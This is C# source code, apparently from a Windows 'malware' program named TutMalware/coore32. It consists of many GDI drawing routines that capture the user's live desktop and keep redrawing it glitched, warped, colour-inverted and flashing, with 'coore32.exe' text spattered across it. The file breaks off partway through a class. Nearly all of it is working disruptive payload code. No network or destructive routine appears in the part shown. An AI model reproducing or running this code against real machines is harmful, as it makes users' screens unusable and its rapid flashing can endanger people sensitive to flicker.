// TutMalware.Program
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using coore32;
using Microsoft.Win32;

internal static class Program
{
    private class ReDrawer : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            for (int i = 0; i < 3; i++)
            {
                Redraw();
            }
            Thread.Sleep(random.Next(7500));
        }
    }
    private class Drawer1 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);
                BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                for (int i = 0; i < 50; i++)
                {
                    int num = 0;
                    int num2 = 100;
                    int num3 = random.Next(0, screenW - num);
                    int num4 = random.Next(0, screenH - num2);
                    BitBlt(hcdc, random.Next(-10, 11), num4, screenW, num2, hcdc, 0, num4, 13369376);
                    BitBlt(hcdc, num3, random.Next(-10, 11), num, screenH, hcdc, num3, 0, 13369376);
                    BitBlt(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, 13369376);
                }
                DeleteObject(hcdc);
                DeleteObject(hBitmap);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer2 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                Graphics g = Graphics.FromHdc(intPtr);
                Pen pen = new Pen(Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203)), random.Next(69));
                // Set the StartCap property.
                pen.StartCap = System.Drawing.Drawing2D.LineCap.Round;

                // Set the EndCap property.
                pen.EndCap = System.Drawing.Drawing2D.LineCap.Round;
                Point start = new Point(random.Next(screenW), random.Next(screenH));
                Point control1 = new Point(random.Next(screenW), random.Next(screenH));
                Point control2 = new Point(random.Next(screenW), random.Next(screenH));
                Point end = new Point(random.Next(screenW), random.Next(screenH));
                g.DrawBezier(pen, start, control1, control2, end);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
            }
            catch
            {

            }
            Thread.Sleep(random.Next(10));
        }
    }

    private class Drawer3 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                Graphics g = Graphics.FromHdc(intPtr);
                Pen pen = new Pen(Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203)), random.Next(69));
                // Set the StartCap property.
                pen.StartCap = System.Drawing.Drawing2D.LineCap.Round;

                // Set the EndCap property.
                pen.EndCap = System.Drawing.Drawing2D.LineCap.Round;
                Point point1 = new Point(random.Next(screenW), random.Next(screenH));
                Point point2 = new Point(random.Next(screenW), random.Next(screenH));
                Point point3 = new Point(random.Next(screenW), random.Next(screenH));
                Point point4 = new Point(random.Next(screenW), random.Next(screenH));
                Point point5 = new Point(random.Next(screenW), random.Next(screenH));
                Point point6 = new Point(random.Next(screenW), random.Next(screenH));
                Point point7 = new Point(random.Next(screenW), random.Next(screenH));
                Point[] curvePoints = { point1, point2, point3, point4, point5, point6, point7 };

                // Draw lines between original points to screen.
                g.DrawCurve(pen, curvePoints);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
            }
            catch
            {

            }
            Thread.Sleep(random.Next(10));
        }
    }

    private class Drawer4 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 100;
                int num9 = Screen.PrimaryScreen.Bounds.Height / 100;
                float num2 = 0f;
                float num3 = 0f;
                float num4 = 100f;
                for (float num5 = 0f; (double)num5 < num; num5 += 0.01f)
                {
                    float num6 = (float)Math.Sin(num5);
                    redrawCounter++;
                    int num7 = redrawCounter;
                    int num8 = (int)(num2 * num4 + num3);
                    BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num2 = num6;
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                //BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer5 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);
                BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                for (int i = 0; i < 10; i++)
                {
                    BitBlt(hcdc, 0, 0, screenW, screenH, hcdc, random.Next(-5, 6), random.Next(-5, 6), 15597702);
                    IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                    SelectObject(hcdc, hgdiobj);
                    PatBlt(hcdc, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)15.9375;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, screenW, screenH, blf);
                DeleteObject(hcdc);
                DeleteObject(hBitmap);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer6 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 1000;
                int num9 = Screen.PrimaryScreen.Bounds.Height / 1000;
                float num2 = 0f;
                float num3 = 0f;
                float num4 = 1000f;
                for (float num5 = 0f; (double)num5 < num; num5 += 0.001f)
                {
                    float num6 = (float)Math.Sin(num5);
                    redrawCounter++;
                    int num7 = redrawCounter;
                    int num8 = (int)(num2 * num4 + num3);
                    BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num2 = num6;
                }
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer7 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                for (int i = 0; i < screenH; i++)
                {

                    BitBlt(intPtr, 0, i, screenW, 1, intPtr, -screenW - random.Next(-10, 11), i, 13369376);
                    BitBlt(intPtr, 0, i, screenW, 1, intPtr, screenW + random.Next(-10, 11), i, 13369376);
                    BitBlt(intPtr, 0, i, screenW, 1, intPtr, random.Next(-10, 11), i, 13369376);
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer8 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 1, 4457256);
                //PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.SourceErase);
                for (int i = 0; i < 500; i++)
                {
                    int num = random.Next(-screenW, screenW + screenW);
                    int num2 = random.Next(-screenH, screenH + screenH);
                    int nWidth = random.Next(-screenW, screenW + screenW);
                    int nHeight = random.Next(-screenH, screenH + screenH);
                    BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-1, 2), num2 + random.Next(-1, 2), 13369376);
                }
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    private class Drawer9 : Drawer
    {
        private int redrawCounter;

        public unsafe override void Draw(IntPtr hdc)
        {
            try
            {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                Graphics graphics = Graphics.FromImage(bitmap);
                graphics.SmoothingMode = SmoothingMode.HighSpeed;
                graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                float num = 100f;
                num = (100f + num) / 100f;
                num *= num;
                Bitmap bitmap2 = (Bitmap)bitmap.Clone();
                BitmapData bitmapData = bitmap2.LockBits(new Rectangle(0, 0, bitmap2.Width, bitmap2.Height), ImageLockMode.ReadWrite, bitmap2.PixelFormat);
                int height = bitmap2.Height;
                int width = bitmap2.Width;
                for (int i = 0; i < height; i++)
                {
                    byte* ptr = (byte*)(void*)bitmapData.Scan0 + i * bitmapData.Stride;
                    int num2 = 0;
                    for (int j = 0; j < width; j++)
                    {
                        byte b = ptr[num2];
                        byte b2 = ptr[num2 + 1];
                        float num3 = (float)(int)ptr[num2 + 2] / 255f;
                        float num4 = (float)(int)b2 / 255f;
                        float num5 = (float)(int)b / 255f;
                        float num6 = ((num3 - 0.5f) * num + 0.5f) * 255f;
                        num4 = ((num4 - 0.5f) * num + 0.5f) * 255f;
                        num5 = ((num5 - 0.5f) * num + 0.5f) * 255f;
                        int num7 = (int)num6;
                        num7 = ((num7 > 255) ? 255 : num7);
                        num7 = ((num7 >= 0) ? num7 : 0);
                        int num8 = (int)num4;
                        num8 = ((num8 > 255) ? 255 : num8);
                        num8 = ((num8 >= 0) ? num8 : 0);
                        int num9 = (int)num5;
                        num9 = ((num9 > 255) ? 255 : num9);
                        num9 = ((num9 >= 0) ? num9 : 0);
                        ptr[num2] = (byte)num9;
                        ptr[num2 + 1] = (byte)num8;
                        ptr[num2 + 2] = (byte)num7;
                        num2 += 4;
                    }
                }
                bitmap2.UnlockBits(bitmapData);
                Bitmap bitmap3 = new Bitmap(bitmap2);
                IntPtr hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero)).GetHdc();
                IntPtr intPtr = CreateCompatibleDC(hdc2);
                SelectObject(intPtr, bitmap3.GetHbitmap());
                BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, -10, 0, 13369376);
                BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, screenW - 10, 0, 13369376);
                //BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, screenW - 10, -screenH+10, 13369376);
                //BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, 10, -screenH+10, 13369376);
                DeleteObject(hdc2);
                DeleteObject(intPtr);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer10 : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            try
            {
                int si = random.Next(50, 500);
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                Graphics graphics = Graphics.FromHdc(intPtr);
                Pen pen = new Pen(Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203)), random.Next(10));
                for (int y = 0; y < screenH; y += si)
                {
                    for (int x = 0; x < screenW; x += si)
                    {
                        graphics.DrawEllipse(pen, x, y, si, si);
                    }
                }

                //for (int i = 0; i < 50; i++)
                //{
                //    int num = random.Next(-screenW, screenW + screenW);
                //    int num2 = random.Next(-screenH, screenH + screenH);
                //    int nWidth = random.Next(-screenW, screenW + screenW);
                //    int nHeight = random.Next(-screenH, screenH + screenH);
                //    BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-1, 2), num2 + random.Next(-1, 2), 13369376);
                //}

                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                ReleaseDC(intPtr, intPtr2);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    private class Drawer11 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 100;
                double num2 = Screen.PrimaryScreen.Bounds.Height / 100;
                float num3 = 0f;
                float num4 = 0f;
                float num5 = 5f;
                for (float num6 = 0f; (double)num6 < num; num6 += 0.01f)
                {
                    float num7 = (float)Math.Sin(num6);
                    redrawCounter++;
                    int num8 = redrawCounter;
                    int num9 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num3 = num7;
                }
                for (float num10 = 0f; (double)num10 < num2; num10 += 0.01f)
                {
                    float num11 = (float)Math.Sin(num10);
                    redrawCounter2++;
                    int num12 = redrawCounter2;
                    int num13 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    if (redrawCounter2 >= screenH)
                    {
                        redrawCounter2 = 0;
                    }
                    num3 = num11;
                }
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 6684742);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer12 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 100;
                double num2 = Screen.PrimaryScreen.Bounds.Height / 100;
                float num3 = 0f;
                float num4 = 0f;
                float num5 = 5f;
                for (float num6 = 0f; (double)num6 < num; num6 += 0.01f)
                {
                    float num7 = (float)Math.Sin(num6);
                    redrawCounter++;
                    int num8 = redrawCounter;
                    int num9 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num3 = num7;
                }
                for (float num10 = 0f; (double)num10 < num2; num10 += 0.01f)
                {
                    float num11 = (float)Math.Sin(num10);
                    redrawCounter2++;
                    int num12 = redrawCounter2;
                    int num13 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    if (redrawCounter2 >= screenH)
                    {
                        redrawCounter2 = 0;
                    }
                    num3 = num11;
                }
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 15597702);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer13 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 100;
                double num2 = Screen.PrimaryScreen.Bounds.Height / 100;
                float num3 = 0f;
                float num4 = 0f;
                float num5 = 10f;
                for (float num6 = 0f; (double)num6 < num; num6 += 0.01f)
                {
                    float num7 = (float)Math.Sin(num6);
                    redrawCounter++;
                    int num8 = redrawCounter;
                    int num9 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num8, num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    BitBlt(intPtr, num8, -screenH + num9, 1, screenH, intPtr, num8, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num3 = num7;
                }
                for (float num10 = 0f; (double)num10 < num2; num10 += 0.01f)
                {
                    float num11 = (float)Math.Sin(num10);
                    redrawCounter2++;
                    int num12 = redrawCounter2;
                    int num13 = (int)(num3 * num5 + num4);
                    BitBlt(intPtr, num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    BitBlt(intPtr, -screenW + num13, num12, screenW, 1, intPtr, 0, num12, 13369376);
                    if (redrawCounter2 >= screenH)
                    {
                        redrawCounter2 = 0;
                    }
                    num3 = num11;
                }
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.Purple));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 8913094);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer14 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, random.Next(-10, 10), random.Next(-10, 10), 4457256);
                IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(random.Next(85, 136), random.Next(1, 33), random.Next(153, 203))));
                SelectObject(intPtr, hgdiobj);
                PatBlt(intPtr, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer15 : Drawer
    {
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                for (int i = 0; i < 50; i++)
                {
                    int num = random.Next(-screenW, screenW + screenW);
                    int num2 = random.Next(-screenH, screenH + screenH);
                    int nWidth = random.Next(-screenW, screenW + screenW);
                    int nHeight = random.Next(-screenH, screenH + screenH);
                    BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-10, 11), num2 + random.Next(-10, 11), 13369376);
                }
                Graphics graphics = Graphics.FromHdc(intPtr);
                try
                {
                    graphics.DrawString("coore32.exe", new Font("UD Digi Kyokasho NP-R", random.Next(1, 100)), new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255))), random.Next(screenW), random.Next(screenH));
                }
                catch
                {
                    graphics.DrawString("coore32.exe", new Font("Trebuchet MS", random.Next(1, 100)), new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255))), random.Next(screenW), random.Next(screenH));
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    private class Drawer16 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 10;
                int num9 = Screen.PrimaryScreen.Bounds.Height / 10;
                float num2 = 0f;
                float num3 = 0f;
                float num4 = 5f;
                for (float num5 = 0f; (double)num5 < num; num5 += 0.1f)
                {
                    float num6 = (float)Math.Sin(num5);
                    redrawCounter++;
                    int num7 = redrawCounter;
                    int num8 = (int)(num2 * num4 + num3);
                    BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num2 = num6;
                }
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer17 : Drawer
    {
        private int redrawCounter;

        private int redrawCounter2;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                double num = Screen.PrimaryScreen.Bounds.Width / 10;
                int num9 = Screen.PrimaryScreen.Bounds.Height / 10;
                float num2 = 0f;
                float num3 = 0f;
                float num4 = 10f;
                for (float num5 = 0f; (double)num5 < num; num5 += 0.1f)
                {
                    float num6 = (float)Math.Sin(num5);
                    redrawCounter++;
                    int num7 = redrawCounter;
                    int num8 = (int)(num2 * num4 + num3);
                    BitBlt(intPtr, num7, num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    BitBlt(intPtr, num7, -screenH + num8, 1, screenH, intPtr, num7, 0, 13369376);
                    if (redrawCounter >= screenW)
                    {
                        redrawCounter = 0;
                    }
                    num2 = num6;
                }

                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 6684742);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch { }
        }
    }

    private class Drawer18 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                for (int i = 0; i < 500; i++)
                {
                    int num = random.Next(-screenW, screenW + screenW);
                    int num2 = random.Next(-screenH, screenH + screenH);
                    int nWidth = random.Next(-screenW, screenW + screenW);
                    int nHeight = random.Next(-screenH, screenH + screenH);
                    BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-1, 2), num2 + random.Next(-1, 2), 13369376);
                }
                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)127.5;
                blf.AlphaFormat = 0;
                AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, blf);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
                Thread.Sleep(random.Next(10));
            }
            catch
            {
            }
        }
    }

    private class Drawer19 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                int num = random.Next(1, 7);
                Rectangle rect = new Rectangle(random.Next(1, screenW), random.Next(1, screenH), random.Next(1, screenW), random.Next(1, screenH));
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
